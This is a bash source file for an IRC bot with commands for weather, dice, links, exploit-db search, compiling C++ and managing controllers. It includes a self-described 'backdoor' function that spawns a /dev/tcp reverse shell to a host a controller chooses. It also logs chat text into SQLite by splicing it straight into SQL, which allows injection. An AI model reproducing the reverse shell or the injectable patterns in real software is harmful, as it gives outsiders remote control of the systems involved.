#!/bin/bash



CHANNEL_COMMANDS=( "link" "squelch" "uptime" "explode" "shorten" "ticker" "insult" "google" "exploitdb" "weather" "compile" "rot13" "silly" "oper" "deop" "join" "part" "quit" "keyword" "controller" "roll" "karma" "compliment" "joke" )

CHANNEL_FUNCTIONS=( run_link run_squelch run_uptime run_explode run_shorten run_ticker run_insult run_google run_exploit_search run_weather run_compile run_rot13 run_randsentence run_op run_deop run_join run_part run_quit run_keyword run_controller run_roll run_karma run_compliment run_joke )



authenticated(){

  SENDER=$1

  RESPOND=$2

  RETURN=$3



  FOUND="false"



  for controller in "${ALLOWED_PM_CONTROLLERS[@]}"; do

    if [ $controller == $SENDER ]; then

       FOUND="true"

    fi

  done



  [ "$FOUND" == "false" ] && message_post $RESPOND "Sorry - you are not a controller" && eval $RETURN=0 && return



  eval $RETURN=1

}



nick_callback(){

  debug "nick change request - $@"

  NICK_INFO=${1%%\!*}

  NICK_INFO=${NICK_INFO:1}



  DEST_NICK=$3



  if [ "$NICK_INFO" == "$nick" ]; then

    if [ "${DEST_NICK:0:1}" == ":" ]; then

      DEST_NICK=${DEST_NICK:1}

    fi

    debug "changed to $DEST_NICK"

    nick="$DEST_NICK"

  fi

}



message_post(){

  DESTINATION=$1

  shift

  msg_send "PRIVMSG $DESTINATION :$*"

}



source karma.sh



run_karma(){

    SENDER=$1

    CHANNEL=$2



    shift 2



    if [ "$1" != "get" ]; then

      authenticated $SENDER $CHANNEL RESULT

      [ ${RESULT} -eq 0 ] && message_post $1 "You are not a controller (only controllers can directly alter karma)" && return

    fi



    karma_command $*

}



run_log(){

  SENDER=$1

  CHANNEL=$2

  shift 2



  if X"$LOG_CHANNELS" != "Xyes" ; then

    return

  fi



  if [ ! -e "$CHANNEL.db" ]; then

    debug "No channel for $CHANNEL exists.. creating"

    sqlite3 "$CHANNEL.db" <<EOF

CREATE TABLE IF NOT EXISTS messages (

    sender TEXT NOT NULL,

    message TEXT NOT NULL,

    isaction INTEGER DEFAULT 0,

    currentdate TEXT NOT NULL

);

EOF

    if [ ! -e "$CHANNEL.db" ]; then

      return

    fi

  fi



  debug "Logging"

  sqlite3 "$CHANNEL.db" 2>sqlite-errors >&2 <<EOF

INSERT INTO messages(sender, message, isaction, currentdate)

VALUES

 ("$SENDER", "$*", 0, DATETIME('now', 'localtime'));

EOF

  debug "Logged"



}



run_roll(){

  SENDER=$1

  CHANNEL=$2



  shift 2



  params="$1"

  if [[ $params =~ ^([0-9]+)d([0-9]+)$ ]]; then

    num_dice="${BASH_REMATCH[1]}"

    num_sides="${BASH_REMATCH[2]}"

    if [ $num_sides -lt 2 -o $num_sides -gt 99 ]; then

       message_post $CHANNEL "$SENDER, bad number of sides"

       return

    fi

    if [ $num_dice -lt 1 -o $num_dice -gt 100 ]; then

      message_post $CHANNEL "$SENDER, bad number of dice"

      return

    fi

    local roll_result=0

    for (( i=0; $i < $num_dice; i+=1 )); do

       local out=0

       random_number $num_sides out

       ((roll_result = $roll_result + $out ))

    done

    message_post $CHANNEL "You rolled $roll_result"

    return

  fi



  message_post $CHANNEL "roll needs to look like: !roll [0-9]+d[0-9]+"

}



run_explode(){

  SENDER=$1

  CHANNEL=$2



  shift 2



  [ ! "$1" ] && message_post $CHANNEL "Explode requires a URL, and un-shrinks it" && return

  URL=$($CURL_BIN -I -s "$1" | $GREP_BIN -F 'Location:' | $CUT_BIN -d" " -f2)

  message_post $CHANNEL "Exploded url: $URL "

}



run_noop(){

  echo ""

}



run_squelch(){

  SENDER=$1

  CHANNEL=$2

  shift 2



  authenticated $SENDER $CHANNEL RESULT

  [ ${RESULT} -eq 0 ] && message_post $1 "You are not a controller (only controllers can squelch functions)" && return



  LINK_STATE="linking"

  sleep 10



  message_post $CHANNEL "$SENDER - squelching not available"



}



run_link(){

  SENDER=$1

  CHANNEL=$2

  shift 2



  authenticated $SENDER $CHANNEL RESULT

  [ ${RESULT} -eq 0 ] && message_post $1 "You are not a controller (only controllers can request link)" && return



  LINK_STATE="linking"

  sleep 10



  message_post $CHANNEL "$SENDER - linking is not currently implemented"

}



run_uptime(){

  SENDER=$1

  DEST=$2

  shift 2



  UPTIME=$($UPTIME_BIN )



  message_post $DEST "Uptime - $UPTIME"

}



run_weather(){

  SENDER=$1

  RESPOND=$2



  shift 2



  [ ! "$1" ] && message_post $RESPOND "Error - need a zip or city,state" && return



  WEATHER_REPORT=$($CURL_BIN "wttr.in/${1}" 2>/dev/null)



  CITY=$(echo "$WEATHER_REPORT" | head -n1 | $SED_BIN -e 's@^Weather report: @@')

  CONDITION=$(echo "$WEATHER_REPORT" | head -n 3 | tail -n1 | $SED_BIN -e 's@^.*\[0m\s*@@')

  TEMP=$(echo "$WEATHER_REPORT" | head -n4 | tail -n1 | $SED_BIN -e "s,\x1B\[[0-9;]*[a-zA-Z],,g" | $GREP_BIN -E -o '[0-9]+(-[0-9]+)?\s*°(F|C|K)')



  [ "$CITY" ] && message_post $RESPOND "For [ $CITY ], temp [ $TEMP ], and [ $CONDITION ]" && return



  message_post $RESPOND "No results for [ $* ]"

}



run_op(){

  authenticated $1 $2 RESULT

  [ ${RESULT} -eq 0 ] && message_post $1 "You are not a controller" && return



  message_post $2 "By the power of Greyskull..."



  CHANNEL=$2



  [ "$3" ] && shift 2



  echo "MODE $CHANNEL +o $1"

}



run_deop(){

  authenticated $1 $2 RESULT

  [ ${RESULT} -eq 0 ] && message_post $1 "You are not a controller" && return



  CHANNEL=$2



  [ "$3" ] && shift 2



  echo "MODE $CHANNEL -o $1"  



  message_post $CHANNEL "When someone asks if you're a god..."



}



run_ping(){



  authenticated $1 $2 RESULT

  [ ${RESULT} -eq 0 ] && message_post $1 "Unable to ping - you are not a controller" && return



  [ ! -e $PING_BIN ] && message_post $1 "No ping utility installed" && return

  [ ! -e $GREP_BIN ] && message_post $1 "No grep utility installed" && return



  [ ! "$3" ] && message_post $1 "Must supply a host to ping" && return



  message_post $1 "Sending ping to [ $3 ]"



  RESULT=$($PING_BIN -c 1 "$3" | $GREP_BIN "received")



  message_post $1 "Result [ $RESULT ]"

}



run_join(){

  authenticated $1 $2 RESULT

  [ ${RESULT} -eq 0 ] && message_post $1 "Unable to join - you are not a controller" && return



  [ ! "$3" ] && message_post $1 "Need to specify a room to join" && return

  [ ! "${3:0:1}" == "#" ] && message_post $1 "Room name [ $3 ] seems bad" && return



  msg_send "JOIN $3"

  message_post $1 "Attempted to join room"

}



run_part(){

  authenticated $1 $2 RESULT

  [ ${RESULT} -eq 0 ] && message_post $1 "Unable to part - you are not a controller" && return



  [ ! "$3" ] && message_post $1 "Need to specify a room to leave" && return

  [ ! "${3:0:1}" == "#" ] && message_post $1 "Room name [ $3 ] seems bad" && return



  msg_send "PART $3"

  message_post $1 "Attempted to leave room"

}



random_number(){

  RANGE=$1

  RESULT=$2



  if [ $RANGE -lt 1 ]; then

      RANGE=0

  fi



  eval $RESULT=$[ ($RANDOM % $RANGE) ]

}



run_google(){

  SENDER=$1

  RESPOND=$2



  shift 2

  [ ! "$1" ] && message_post $RESPOND "Specify a search term" && return



  SEARCH_TERMS="$1"

  shift

  for var in "$@"; do

      SEARCH_TERMS="$SEARCH_TERMS+$var"

  done



  debug "Searching $SEARCH_TERMS"



  SEARCH_RESULT=$($CURL_BIN -A Mozilla "http://ajax.googleapis.com/ajax/services/search/web?v=1.0&q=$SEARCH_TERMS" | $GREP_BIN -Eo "(unescapedUrl|titleNoFormatting)\"\:\"([a-z]|[A-Z]|[0-9]|[:]|[/]|[/.]|[\\]|[ ]|[/-]|[&]|[/=]|[/?]|['])*" | $SED_BIN 's@":"@,@g')



  POSTED="false"



  I=0

  while [ $I -lt 5 ]; do

      CURRENT_TITLE_SLICE=$(echo "${SEARCH_RESULT}" | $GREP_BIN title -m ${I} | $TAIL_BIN -n 1 | $CUT_BIN -d"," -f2)

      CURRENT_URL_SLICE=$(echo "${SEARCH_RESULT}" | $GREP_BIN unescapedUrl -m ${I} | $TAIL_BIN -n 1 | $CUT_BIN -d"," -f2)

      [ "${CURRENT_URL_SLICE}" -a "${CURRENT_TITLE_SLICE}" ] && message_post $RESPOND "Match ${I} : ${CURRENT_URL_SLICE}, ${CURRENT_TITLE_SLICE}" && POSTED="true"

      ((I=$I + 1))

  done



  [ "$POSTED" != "true" ] && message_post $RESPOND "No results."

}



run_randsentence(){

  BEGINNING=( "Sometimes, the" "The" "Once upon a time, the" "Any" "Always, the" "Oh no, the" "My" )

  NOUN=( "school" "yard" "house" "ball" "shoes" "shirt" "fan" "purse" "bag" "pants" "toaster" "lamp" "floor" "door" "table" "bread" "dresser" "cup" "salt" "pepper" "plate" "dog" "cat" "wood" "stool" "suitcase" "plane" "bus" "car" "bike" "phone" "pillow" "wall" "window" "bed" "blanket" "hand" "head" "bra" "eyes" "sock" "plastic" "card board" "panty" "oven" "bow" "hair" "person" "clock" "foot" "boy" "book" "ear" "girl" "park" "basket" "woman" "street" "box" "man" "pussy"  "beaver" )

  VERB=( "bounced" "cried" "jumped" "yelled" "flew" "screamed" "coughed" "smoked" "sneezed" "exploded" "vomited" "fell" "burned" "smiled" "spied" "slept" "drove" "fucked" "skipped" "ran" "walked" "died" "laughed" "sang" "tripped" "frowned" "slipped" "committed murder" )

  ADJECTIVE=( "a beautiful" "a black" "an old" "the ugly" "my wet" "some red" "a loud" "the blue" "that dry" "a quiet" "a purple" "a hairy" "a mediocre" "the yellow" "a bald" "the melancholy" "the white" "the smooth" "a bright" "the clear" "that rough" "a dark" "the round" "a sexual" "the heavy" "the square" "a sexy" "that smelly" "my triangular" "my angry" "your disgusting" "an octagon" "the sad" "a delicious" "that precious" "happy" "that fat" "the distinguished" "a scared" "that skinny" "the burnt" "my brown" "a new" )



  random_number ${#BEGINNING[@]} GET_BEGINNING

  random_number ${#NOUN[@]} GET_NOUN

  random_number ${#NOUN[@]} GET_ANOTHER_NOUN

  random_number ${#VERB[@]} GET_VERB

  random_number ${#ADJECTIVE[@]} GET_ADJECTIVE



  message_post $2 "$1: ${BEGINNING[$GET_BEGINNING]} ${NOUN[$GET_NOUN]} ${VERB[$GET_VERB]} ${ADJECTIVE[$GET_ADJECTIVE]} ${NOUN[$GET_ANOTHER_NOUN]}"

}



run_joke(){

    RAND_JOKE=$(curl -s https://icanhazdadjoke.com)

    message_post $2 "$RAND_JOKE"

}



run_compliment(){

    [ ! "$COMPLIMENTS" ] && COMPLIMENTS=$(curl -q http://www.complimentgenerator.co.uk/ 2>/dev/null | grep p\ class | egrep -v 'class="(brand|sent|copyright)"' | sed -e 's@</p>@\\n@' -e 's@\s*<p class=".*">@@' -e "s@&#039;@'@g")

    [ ! "$COMPLIMENTS" ] && message_post $2 "Sorry, $1 - I cannot send compliments at this time"



    if [ ! "$3" ]; then

        COMPLIMENTEE="$1"

    else

        COMPLIMENTEE="$3"

    fi



    SIZE_OF_COMPLIMENTS=$(echo $COMPLIMENTS | sed -e 's@\\n@\

@g' | wc -l)

    random_number $SIZE_OF_COMPLIMENTS COMPLIMENT



    COMPLIMENT_TEXT=$(echo $COMPLIMENTS | sed -e 's@\\n@\

@g' | head -n $COMPLIMENT | tail -n 1)



    message_post $2 "$COMPLIMENTEE, $COMPLIMENT_TEXT"

}



run_nick(){

  authenticated $1 $2 RESULT

  [ ${RESULT} -eq 0 ] && message_post $1 "Unable to change nick - you are not a controller" && return



  [ ! "$3" ] && message_post $1 "Need to specify a new nick" && return

  [ "${3:0:1}" == "#" ] && message_post $1 "Nick [ $3 ] seems bad" && return



  msg_send "NICK $3"

  message_post $1 "Changed nick"

}



run_speak(){



  authenticated $1 $2 RESULT

  [ ${RESULT} -eq 0 ] && message_post $1 "Unable - you are not a controller" && return



  [ ! "$3" ] && message_post $1 "Need to give me a target" && return

  [ $# -lt 4 ] && message_post $1 "Need to give me something to say" && return



  SENDER="$1"

  DEST="$3"

 

  shift 3



  message_post $SENDER "Okay"

  message_post $DEST "$*"



}



run_quit(){

  authenticated $1 $2 RESULT

  [ ${RESULT} -eq 0 ] && message_post $1 "Unable to quit - you are not a controller" && return



  message_post $1 "Okay, bye"

  

  shift 2

  echo "QUIT $*"

  sleep 1

  exit 0

}



run_resolve(){

   MATCH=$(echo "$*" | $GREP_BIN -o -E "(http|https)(:[/][/])([a-z]|[A-Z]|[0-9]|[/=]|[/?]|[&]|[/-]|[/.]|[~])*" 2>/dev/null)



   if [ $? -eq 0 -a "$MATCH" ]; then

      # first resolve the url

      #echo "MATCHED: $MATCH"

      RESULT=$($CURL_BIN -L "$MATCH" 2>/dev/null)

      echo "$RESULT"

   fi

}



#

# Yes, this _IS_ a 'backdoor' - albeit - you must actually set

# ALLOW_REVERSE_SHELL somewhere for it to work.

#

run_reverseshell(){



  authenticated $1 $2 RESULT

  [ ${RESULT} -eq 0 ] && message_post $1 "Unable to join - you are not a controller" && return



  [ $ALLOW_REVERSE_SHELL -eq 0 ] && message_post $1 "No reverse shell" && return



  [ ! -x $CAT_BIN ] && message_post $1 "No cat binary" && return

  [ ! -x $NOHUP_BIN ] && message_post $1 "No nohup" && return

  [ ! -x $CHMOD_BIN ] && message_post $1 "No chmod binary" && return

  [ ! -x $RM_BIN ] && message_post $1 "No rm binary" && return



  [ ! "$3" ] && message_post $1 "Must specify a host" && return

  [ ! "$4" ] && message_post $1 "Must specify a port" && return



  message_post $1 "Spawning a forked reverse shell to [$3:$4]..."



  TMPSHELL=$($MKTEMP_BIN)



  message_post $1 "Writing a makeshell shell script"

  $CAT_BIN > $TMPSHELL <<EOF

#!/bin/bash

exec 3<> /dev/tcp/$3/$4

if [ $? != 0 ]; then

   exit 0

fi

/bin/bash 0<&3 1>&3- 2>/dev/null 

rm -f $TMPSHELL

EOF

  $CHMOD_BIN +x $TMPSHELL 2>/dev/null >/dev/null



  [ ! -x $TMPSHELL ] && message_post $1 "Cannot make shell - failed" && $RM_BIN -f $TMPSHELL && return

  

  $($NOHUP_BIN $TMPSHELL $3 $4 >/dev/null </dev/null 2>/dev/null &)

  message_post $1 "Spawned"

}



run_keyword(){

  [ ! "$3" ] && message_post $1 "Please say one of (off|on|clear|add|del)" && return



  if [ "$3" == "off" ]; then



    authenticated $1 $2 RESULT

    [ ${RESULT} -eq 0 ] && message_post $1 "Unable to change kw status - you are not a controller" && return

    message_post $2 "Use keywords off"

    USE_KEYWORDS="0"

  elif [ "$3" == "on" ]; then

    authenticated $1 $2 RESULT

    [ ${RESULT} -eq 0 ] && message_post $1 "Unable to change kw status - you are not a controller" && return



    message_post $2 "Use keywords on"

    USE_KEYWORDS="1"

  elif [ "$3" == "clear" ]; then

    authenticated $1 $2 RESULT

    [ ${RESULT} -eq 0 ] && message_post $1 "Unable to change kw status - you are not a controller" && return



    KEYWORDS=()

    KEYWORD_RESPONSES=()

  elif [ "$3" == "add" ]; then

    [ ! "$4" ] && message_post $1 "Requires a word" && return

    [ ! "$5" ] && message_post $1 "Requries at least a one word response" && return

   

    SENDER=$2

    shift 3

    KW=$1

    KEYWORDS=("${KEYWORDS[@]}" "$1")

    shift 1

    RSP="$*"

    KEYWORD_RESPONSES=("${KEYWORD_RESPONSES[@]}" "$*")



    message_post $SENDER "Added [ $KW ] with [ $RSP ]"

  elif [ "$3" == "list" ]; then

    [ ! "$4" ] && message_post $1 "Give me a keyword" && return

    I=0

    for found in "${KEYWORDS[@]}"; do

      result=$(echo "$*" | $GREP_BIN -i "$found")

      if [ "${result}" ]; then

        message_post $2 "Keyword [ ${KEYWORDS[${I}]} ] is [ ${KEYWORD_RESPONSES[$I]} ]"

        return

      fi

      ((I=$I+1))

    done



  elif [ "$3" == "del" ]; then

    authenticated $1 $2 RESULT

    [ ${RESULT} -eq 0 ] && message_post $1 "Unable to change kw status - you are not a controller" && return

    I=0

    for found in "${KEYWORDS[@]}"; do

      result=$(echo "$*" | $GREP_BIN -i "$found")

      if [ "${result}" ]; then

          KEYWORDS=(${KEYWORDS[@]:0:$I} ${KEYWORDS[@]:$(($I + 1))})

          KEYWORD_RESPONSES=(${KEYWORD_RESPONSES[@]:0:$I} ${KEYWORD_RESPONSES[@]:$(($I + 1))})

          message_post $2 "Removed keyword [ $found ]"

          return

      fi

      (( I=$I+1 ))

    done

  fi



}



run_shorten(){

   [ ! "$3" ] && message_post $2 "Unable to shorten blank url" && return



   URL="https://is.gd/create.php?format=simple&url=$3"

   RESULT=$($CURL_BIN -s $URL)



   message_post $2 "Shortened [ $RESULT ]"

}



#GCC_FLAGS="-w"



run_controller(){



  SENDER=$1

  RESPOND=$2



  [ ! "$3" ] && message_post $RESPOND "Please say one of (list|add|del)" && return



  if [ "$3" == "list" ]; then

    message_post $RESPOND "Bot Controllers [ ${ALLOWED_PM_CONTROLLERS[@]} ]"

  elif [ "$3" == "add" ]; then

    [ ! "$4" ] && message_post $RESPOND "Must give a name" && return



    authenticated $1 $2 RESULT

    [ ${RESULT} -eq 0 ] && message_post $1 "Unable to add - you are not a controller" && return



    ALLOWED_PM_CONTROLLERS=(${ALLOWED_PM_CONTROLLERS[@]} "$4")

    message_post $RESPOND "Added - [ $4 ]"

  elif [ "$3" == "del" ]; then

    [ ! "$4" ] && message_post $RESPOND "Must give a name" && return



    authenticated $1 $2 RESULT

    [ ${RESULT} -eq 0 ] && message_post $1 "Unable to del - you are not a controller" && return



    if [ ${#ALLOWED_PM_CONTROLLERS[@]} -eq 1 ]; then

      message_post $RESPOND "Unable to delete yourself as last op"

      return

    fi



    I=0

    for found in "${ALLOWED_PM_CONTROLLERS[@]}"; do

      if [ "$found" == "$4" ]; then

        ALLOWED_PM_CONTROLLERS=(${ALLOWED_PM_CONTROLLERS[@]:0:${I}} ${ALLOWED_PM_CONTROLLERS[@]:$(($I + 1))})

      fi

      (( I=$I+1 ))

    done

  else

      message_post $RESPOND "Please say one of (list|add|del)"    

  fi

}



run_ticker(){

  SENDER=$1

  CHANNEL=$2

  shift 2



  [ ! "$1" ] && message_post $CHANNEL "Requires a ticker symbol"

  SYM=$1

  DATA=$(curl -s https://www.cnbc.com/quotes/?symbol=$SYM)

  TICKERNAME=$(echo $DATA | egrep -o 'meta itemprop="name"\s+content="[a-zA-Z0-9 ,\.]+' | cut -d\" -f4 | tail -n1)

  TICKERPRICE=$(echo $DATA | egrep -o 'meta itemprop="price"\s+content="[0-9,\.]+' | cut -d\" -f4)



  message_post $CHANNEL "Ticker [ ${TICKERNAME} ] value [ ${TICKERPRICE} ]"

}



run_emote(){

  authenticated $1 $2 RESULT

  [ ${RESULT} -eq 0 ] && message_post $1 "Unable to change kw status - you are not a controller" && return





  [ ! "$3" ] && message_post $1 "Need to give me a dest to emote" && return

  [ $# -lt 4 ] && message_post $1 "Need to give me something to emote" && return



  SENDER="$1"

  DEST="$3"

  

  shift 3

  message_post $SENDER "Okay"

  echo -e "PRIVMSG $DEST :\001ACTION $*\001"

}



run_compile(){



  [ ${AUTHENTICATED_COMPILE} -eq 1 ] && authenticated $1 $2 RESULT

  [ ${AUTHENTICATED_COMPILE} -eq 1 -a ${RESULT} -eq 0 ] && message_post $1 "Sorry, ${1}, but you are not authorized to compile" && return



  SENDER=$1

  RESPONSE=$2



  shift 2



  [ ! "$*" ] && message_post $RESPONSE "Error - nothing to compile" && return

  [ ! -e compile_files.sh ] && message_post $RESPONSE "Error - no compile info" && return



  source compile_files.sh



  local BITS32=""



  [ "$1" == "-32" ] && BITS32="-m32" && shift

  



  COMPILE_TEXT=$(/bin/echo "$*" | $SED_BIN 's@\(#include[\r\n\t ]*<[a-zA-Z0-9\.]*>\)@\1\n@g')

  HASMAIN=$(/bin/echo "${COMPILE_TEXT}" | $GREP_BIN -w -E "main")

  USESRETURN=$(/bin/echo "${COMPILE_TEXT}" | $GREP_BIN -o "return[\t\n\r ]*[a-zA-Z0-9]*[\t\n\r ]*;[\t\n\r ]*}$")



  BADWORDS=( "ioctl" "signal" "sigaction" "syscall" "sysconf" )



  for badword in "${BADWORDS[@]}"; do

    HASWORD=$(/bin/echo "${COMPILE_TEXT}" | $GREP_BIN -w -o "$badword")

    if [ "${HASWORD}" ]; then

      message_post $RESPONSE "blocked app due to: [ $badword ]" 

      return

    fi

  done



  MKTEMP_BIN=/bin/mktemp

  COUTFILE=$($MKTEMP_BIN )

  OOUTFILE=$($MKTEMP_BIN )

  AOUTFILE=$($MKTEMP_BIN)

  WARNFIL=$($MKTEMP_BIN)



  debug "compile to $COUTFILE.cc"



  write_ccfile_preamble ${COUTFILE}



  NEEDSTERM="false"



  if [ ! "$HASMAIN" ]; then

    if [ "$USESRETURN" ]; then

      $CAT_BIN >> ${COUTFILE}.cc <<EOF



int main(int argc __attribute__ ((unused)), char *argv[] __attribute__ ((unused)))

EOF

    else

      $CAT_BIN >> ${COUTFILE}.cc <<EOF



void main(int argc __attribute__ ((unused)), char *argv[] __attribute__ ((unused)))

EOF

    fi

    [ "${1:0:1}" != "{" ] && $(echo "{" >> ${COUTFILE}.cc) && NEEDSTERM="true"

  fi

  



  $(set -f && echo "${COMPILE_TEXT}" >> ${COUTFILE}.cc)



  if [ "$NEEDSTERM" == "true" ]; then

    [ "$USESRETURN" ] && $(echo "return 0; " >> ${COUTFILE}.cc)

    $(echo "}" >> ${COUTFILE}.cc)

  fi



  ERRORS=$(timeout 10s $CXX ${GCC_FLAGS} ${BITS32} -Dmain="APP_TMP_MAIN_main" -c -o ${OOUTFILE}.o ${COUTFILE}.cc 2>&1)



  if [ "$ERRORS" ]; then

    BADSTUFF=$(echo "$ERRORS" | $GREP_BIN -o -E -m 1 "(warning\:|error\:).*" )



    message_post $RESPONSE "submitted: ${BADSTUFF}"

    $RM_BIN -f $AOUTFILE $WARNFIL $OOUTFILE $COUTFILE ${COUTFILE}.cc ${OOUTFILE}.o



    return

  fi



  write_ptrace_watcher ${COUTFILE}



  ERRORS=$($CXX ${GCC_FLAGS} ${BITS32} -fpermissive -w -o $AOUTFILE ${COUTFILE}.cc ${OOUTFILE}.o 2>&1 )

  if [ "$ERRORS" -a $? -eq 1 ]; then

    BADSTUFF=$(echo "$ERRORS" | $GREP_BIN -E -m 1 "(warning\:|error\:|undefined).*" )



    message_post $RESPONSE "precomp: ${BADSTUFF}"



    debug "precomp: ${ERRORS}"



    $RM_BIN -f $AOUTFILE $WARNFIL $OOUTFILE $COUTFILE ${COUTFILE}.cc ${OOUTFILE}.o



    return

  fi



  $CAT_BIN >$WARNFIL <<EOF

#!/bin/bash

ulimit -t 2

#ulimit -u 5

$AOUTFILE 2>&1 | $TR_BIN '\n\r\0' '|||' | $TR_BIN -cd '\11\12\15\40-\176' | /usr/bin/colrm 81



EOF



  $CHMOD_BIN +x $WARNFIL



  RESULT=$( ${WARNFIL} 2>&1 )

 

  $RM_BIN -f $COUTFILE $AOUTFILE $WARNFIL $OOUTFILE



  [ "$RESULT" ] && message_post $RESPONSE "$RESULT" && debug "$RESULT" && return

  message_post $RESPONSE "$SENDER, No output."

}



run_insult(){

  SENDER="$1"

  RESPOND="$2"

  shift 2



  INSULT=$SENDER



  [ "$1" ] && INSULT="$*"



  QUIP=$($CURL_BIN http://www.randominsults.net 2>/dev/null | $GREP_BIN "<strong><i>\(.*\)</i></strong>" | $SED_BIN 's@<[^>]*>@@g' | $SED_BIN 's@&nbsp;@ @g' | $SED_BIN 's@^ *@@g' )



  [ ! "$QUIP" ] && message_post $RESPOND "$SENDER, I am sorry, I cannot be insulting" && return



  message_post $RESPOND "$INSULT, $QUIP"

}



run_rot13(){

  SENDER=$1

  RESPOND=$2

  shift 2

  ROTMSG=$(echo "$*" | $TR_BIN 'a-zA-Z' 'n-za-mN-ZA-M')

  message_post $RESPOND "$ROTMSG"

}



run_cve_search(){

  SENDER=$1

  RESPOND=$2

  shift 2



  debug "$SENDER asked for cve stuff"



  CVENUM=$(echo "$*" | $SED_BIN 's@cve@@g')



  debug "Seeking cve $CVENUM"

 

  RESULT_TXT=$($CURL_BIN "http://www.exploit-db.com/search/?action=search&filter_page=1&filter_cve=${CVENUM}" 2>/dev/null)



  RESULTS=$(echo "$RESULT_TXT" | $GREP_BIN www.exploit-db.com/exploits | $SED_BIN 's@^.*<a  href="\(http\://www.exploit-db.com/exploits/.*\)">\(.*\)</a>@title [ \2 ] link [ \1 ]@g')



  RESULT_NUM=$(echo "$RESULTS" | $GREP_BIN -c title)



  if [ $RESULT_NUM -eq 0 ]; then

    message_post $RESPOND "No results."

  elif [ $RESULT_NUM -eq 1 ]; then

    message_post $RESPOND "$SENDER, $RESULTS"

  else



    if [ $RESULT_NUM -gt 3 ]; then

       RESULT_NUM=3

    fi



    I=0

    while [ $I -lt $RESULT_NUM ]; do

      ((I = $I + 1))

      RESULT=$(echo "$RESULTS" | $GREP_BIN -m ${I} title | $TAIL_BIN -n 1)

      message_post $RESPOND "$SENDER, $RESULT"

    done

  fi



}



run_exploit_search(){

  SENDER=$1

  RESPOND=$2

  shift 2



  # after this point, we have all the stuff

  IS_CVE_SEARCH=$(echo "$1" | $TR_BIN 'a-z' 'A-Z')

  

  if [ "${IS_CVE_SEARCH:0:3}" == "CVE" ]; then

    run_cve_search $SENDER $RESPOND $@

    return

  fi



  SEARCH_TXT=$(echo "$@" | $SED_BIN 's/ /+/g')



  RESULT_TXT=$($CURL_BIN "http://www.exploit-db.com/search/?action=search&filter_page=1&filter_exploit_text=$SEARCH_TXT" 2>/dev/null)



  RESULTS=$(echo "$RESULT_TXT" | $GREP_BIN www.exploit-db.com/exploits | $SED_BIN 's@^.*<a  href="\(http\://www.exploit-db.com/exploits/.*\)">\(.*\)</a>@title [ \2 ] link [ \1 ]@g')



  RESULT_NUM=$(echo "$RESULTS" | $GREP_BIN -c title)



  if [ $RESULT_NUM -eq 0 ]; then

    message_post $RESPOND "No results for [ $@ ]."

  elif [ $RESULT_NUM -eq 1 ]; then

    message_post $RESPOND "$SENDER, $RESULTS"

  else



    if [ $RESULT_NUM -gt 10 ]; then

       message_post $RESPOND "Too many results for [ $@ ] - [ $RESULT_NUM ]."

       return

    elif [ $RESULT_NUM -gt 3 ]; then

       RESULT_NUM=3

    fi



    I=0

    while [ $I -lt $RESULT_NUM ]; do

      ((I = $I + 1))

      RESULT=$(echo "$RESULTS" | $GREP_BIN -m ${I} title | $TAIL_BIN -n 1)

      message_post $RESPOND "$SENDER, $RESULT"

    done

  fi



}



run_mycmd(){



  SENDER="$1"

  RESPOND="$1"

  KW="$2"



  shift 2



  if [ "$KW" == "uptime" ]; then

    [ ! -e $UPTIME_BIN ] && message_post $SENDER "Sorry - no uptime binary" && return

    UPTIME=$($UPTIME_BIN)

    message_post $SENDER "Uptime - $UPTIME"

  elif [ "$KW" == "sysinfo" ]; then

    [ ! -e $UNAME_BIN ] && message_post $SENDER "No uname binary found" && return

    UNAME=$($UNAME_BIN -a)

    message_post $SENDER "Uname - $UNAME"

  elif [ "$KW" == "id" ]; then

    [ ! -e $ID_BIN ] && message_post $SENDER "No id binary" && return

    IDINFO=$($ID_BIN)

    message_post $SENDER "ID [ $IDINFO ]"

  elif [ "$KW" == "keywords" ]; then

    message_post $SENDER "Keywords [ ${KEYWORDS[@]} ]"

  elif [ "$KW" == "ping" ]; then

    run_ping $SENDER $RESPOND $*

  elif [ "$KW" == "rshell" ]; then

    run_reverseshell $SENDER $RESPOND $*

  elif [ "$KW" == "nick" ]; then

    run_nick $SENDER $RESPOND $*

  elif [ "$KW" == "join" ]; then

    run_join $SENDER $RESPOND $*

  elif [ "$KW" == "part" ]; then

    run_part $SENDER $RESPOND $*

  elif [ "$KW" == "speak" ]; then

    run_speak $SENDER $RESPOND $*

  elif [ "$KW" == "emote" ]; then

    run_emote $SENDER $RESPOND $*

  elif [ "$KW" == "keyword" ]; then

    run_keyword $SENDER $RESPOND $*

  elif [ "$KW" == "controller" ]; then

    run_controller $SENDER $RESPOND $*

  elif [ "$KW" == "ticker" ]; then

    run_ticker $SENDER $RESPOND $*

  elif [ "$KW" == "shorten" ]; then

    run_shorten $SENDER $SENDER $*

  elif [ "$KW" == "quit" ]; then

    run_quit $SENDER $RESPOND "$*"

  elif [ "$KW" == "rot13" ]; then

    run_rot13 $SENDER $RESPOND "$*"

  else

    message_post $SENDER "Unknown command: [$KW]"

  fi



  return

}



handler_callback_tome(){

  debug "tome ARGS: $*"



  SENDER="$1"



  ACTION="${2:1}"



  shift 2



  if [ "${ACTION:0:1}" == \! ]; then

     run_mycmd $SENDER "${ACTION:1}" $*

  else

     message_post $1 "Unable to recognize your request [$*]"

  fi



  return

}





#############################################################################

##

## CHANNEL

##

#############################################################################



handler_callback_tochan(){

  debug "TOCHAN ARGS: $*"



  SENDER="$1"

  CHANNEL="$2"



  shift 2



  run_log "$SENDER" "$CHANNEL" "$*"



  if [ "${1:1:1}" == \! ]; then



    I=0

    COMMAND="${1:2}"



    for found in "${CHANNEL_COMMANDS[@]}"; do

      if [ "$COMMAND" == "$found" ]; then

        shift

        debug "Running $COMMAND at $I index [ $* ] "

        ${CHANNEL_FUNCTIONS[${I}]} $SENDER $CHANNEL $*

        return

      fi

      ((I = $I + 1))

    done



    if [ "${1:2}" == "keywords" ]; then

      message_post $CHANNEL "Recognized keywords [ ${KEYWORDS[@]} ]"

    elif [ "${1:2}" == "doctor" ]; then

      [ ! "${2}" ] && message_post $CHANNEL "Doctor is ${DRBOT}" && return

      authenticated $SENDER $CHANNEL RESULT

      [ ${RESULT} -eq 0 ] && message_post $CHANNEL "Sorry, $SENDER, but you can't change this doctor" && return

      [ "${2}" == "on" ] && DRBOT="on" && message_post $CHANNEL "Dr - $DRBOT" && return

      [ "${2}" == "off" ] && DRBOT="off" && message_post $CHANNEL "Dr - $DRBOT" && return

      message_post $CHANNEL "I only understand on/off"

    elif [ "${1:2}" == "help" ]; then

